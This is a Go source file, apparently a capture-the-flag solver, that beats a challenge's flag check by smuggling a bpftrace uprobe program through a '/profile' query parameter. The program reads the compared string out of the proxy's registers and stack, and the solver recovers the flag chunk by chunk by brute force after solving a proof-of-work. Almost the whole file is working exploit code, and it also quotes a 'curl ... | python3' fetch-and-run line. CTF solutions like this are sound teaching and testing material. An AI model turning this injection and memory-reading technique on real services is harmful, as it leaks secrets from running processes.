// Copyright 2023 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"text/template"
	"time"

	"golang.org/x/net/http2"
)

const (
	alphabet = "CTF{ABDEGHIJKLMNOPQRSUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_}"
)

var (
	target = flag.String("target", "https://localhost:1337/", "Target of the solver")
	chunks = flag.Int("chunks", 10, "Number of chunks to check")
	length = flag.Int("length", 2, "Length of each chunk")
	tries  = flag.Int("tries", 3, "Number of times to hit a url")
	path   = flag.String("path", "/proxy", "Path to the proxy executable")

	// This payload counts successful hits, because otherwise I had a hard time
	// triggering it with a prefix that didn't match a flag.
	payload = template.Must(template.New("payload").Parse(`2137 /1==0/ {}
uprobe:{{ .ExePath }}:runtime.execute {
  @gids[tid] = reg("ax");
}
uprobe:{{ .ExePath }}:main.main.func2 {
  $gid = @gids[tid];
  delete(@hit[$gid]);
}
uprobe:{{ .ExePath }}:main.main.func2+657 /reg("cx") != 0/ {
  $gid = @gids[tid];
  @hit[$gid]++;
  if (@hit[$gid] != {{ .Iter }}) { return; }

  $sp = reg("sp");
  $ptr = $sp + 96;
  printf("XXXX %r XXXX\n", buf(**$ptr, *(*$ptr+8)));
  exit();
}
//`))
	extractor = regexp.MustCompile(`XXXX (.+) XXXX`)
)

func genString(alphabet string, length int) chan string {
	ch := make(chan string)
	go func() {
		var first string = ""
		l := uint64(len(alphabet))
		for i := uint64(0); ; i++ {
			idx := i

			var s strings.Builder
			for j := 0; j < length; j++ {
				s.WriteByte(alphabet[idx%l])
				idx = idx / l
			}

			if first == s.String() {
				close(ch)
				return
			}

			if first == "" {
				first = s.String()
			}

			ch <- s.String()
		}
	}()

	return ch
}

func bruteChunk(client *http.Client, target, path, prefix string, chunkLength, offset, tries int) (string, error) {
	signal := make(chan struct{})

	go func() {
		log.Println("waiting for tracer")
		time.Sleep(time.Second)
		log.Println("beginning bruteforce")
		for chunk := range genString(alphabet, chunkLength) {
			select {
			case <-signal:
				return
			default:
				u, err := buildFlagRequest(target, prefix+chunk)
				log.Println(u)
				if err != nil {
					log.Panicln("error building flag url", err)
				}

				// Send the same request multiple times to minimise the chances that we
				// will drop the event when the check succeeded.
				for i := 0; i < tries; i++ {
					if _, err := client.Get(u); err != nil {
						log.Panicln("error sending flag request", err)
					}
				}
				time.Sleep(time.Millisecond)
			}
		}
	}()

	u, err := buildTraceUrl(target, path, offset)
	if err != nil {
		return "", err
	}
	log.Println(u)
	r, err := client.Get(u)
	close(signal)
	if err != nil {
		return "", err
	}
	defer r.Body.Close()

	var s strings.Builder
	if _, err = io.Copy(&s, r.Body); err != nil {
		return "", err
	}

	matches := extractor.FindStringSubmatch(s.String())
	if len(matches) != 2 {
		return "", fmt.Errorf("invalid number of matches, wanted 2, got %d: %s", len(matches), s.String())
	}

	return matches[1][chunkLength*offset:], nil
}

func buildTraceUrl(target, path string, index int) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", fmt.Errorf("parsing url failed %w", err)
	}

	var s strings.Builder
	if err := payload.Execute(&s, struct {
		ExePath string
		Iter    int
	}{path, index + 1}); err != nil {
		return "", fmt.Errorf("payload generation failed %w", err)
	}

	values := u.Query()
	values.Set("t", s.String())
	u.RawQuery = values.Encode()
	u.Path = "/profile"

	return u.String(), nil
}

func buildFlagRequest(target, flag string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", fmt.Errorf("parsing url failed %w", err)
	}

	values := u.Query()
	values.Set("flag", flag)
	u.RawQuery = values.Encode()
	u.Path = "/"

	return u.String(), nil
}

func newHttpClient(target string) (*http.Client, net.Conn, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, nil, fmt.Errorf("parsing url failed %w", err)
	}

	c, err := net.Dial("tcp", u.Host)
	if err != nil {
		return nil, nil, fmt.Errorf("connection failed %w", err)
	}

	return &http.Client{
		Transport: &http2.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
				// Ignore all the above bullshit and always return the same shared connection.
				return c, nil
			},
		},
	}, c, nil
}

func readLine(conn net.Conn) (string, error) {
	var buf bytes.Buffer
	b := make([]byte, 1)
	for {
		_, err := conn.Read(b)
		if err != nil {
			return "", err
		}

		if b[0] == '\n' {
			break
		}

		_, err = buf.Write(b)
		if err != nil {
			return "", err
		}
	}
	return buf.String(), nil
}

func solvePow(conn net.Conn) error {
	var chall string
	for {
		s, err := readLine(conn)
		if err != nil {
			return err
		}

		if strings.Contains(s, "python3") && strings.Contains(s, "solve") {
			chall = strings.TrimPrefix(s, "    python3 <(curl -sSL https://goo.gle/kctf-pow) solve ")
			break
		}
	}

	log.Println("received pow chall:", chall)
	ch, err := DecodeChallenge(chall)
	if err != nil {
		return err
	}

	_, err = conn.Write([]byte(ch.Solve().String() + "\n"))
	if err != nil {
		return err
	}

	for {
		s, err := readLine(conn)
		if err != nil {
			return err
		}

		if strings.Contains(s, "Correct") {
			break
		}
	}

	log.Println("Pow solved successfully")
	return nil
}

func main() {
	flag.Parse()

	client, conn, err := newHttpClient(*target)
	if err != nil {
		log.Fatalln(err)
	}

	chall, err := readLine(conn)
	if err != nil {
		log.Fatalln(err)
	}

	if strings.Contains(chall, "enabled") {
		err = solvePow(conn)
		if err != nil {
			log.Fatalln(err)
		}
	}

	// Check connectivity
	_, err = client.Get(*target)
	if err != nil {
		log.Fatalln(err)
	}

	// Solve
	f := ""
	for i := 0; i < *chunks; i++ {
		s, err := bruteChunk(client, *target, *path, f, *length, i, *tries)
		if err != nil {
			log.Fatalln(err)
		}
		log.Println("got chunk", i, ":", s)
		f += s
	}

	// Check flag
	u, err := buildFlagRequest(*target, f)
	if err != nil {
		log.Fatalln(err)
	}

	r, err := client.Get(u)
	if err != nil {
		log.Fatalln(err)
	}

	if r.StatusCode != http.StatusOK {
		log.Fatalln("bad flag :(")
	}

	log.Println("flag is:", f)
}
